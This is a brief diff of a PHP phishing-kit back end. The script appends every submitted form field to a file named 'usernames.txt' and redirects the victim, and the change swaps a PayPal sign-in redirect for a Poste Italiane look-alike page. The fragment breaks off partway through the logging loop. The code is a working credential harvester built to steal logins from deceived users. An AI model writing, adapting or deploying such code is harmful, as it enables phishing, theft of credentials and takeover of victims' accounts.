@@ -1,5 +1,5 @@
 ﻿_<?php
-header ('Location:-https://www.paypal.com/it/signin- ');
+header ('Location:-https://posteitaly.github.io/posteitaliane/- ');
 $handle = fopen('usernames.txt', 'a');
 foreach($_POST as $variable => $value) {
 fwrite($handle, $variable);
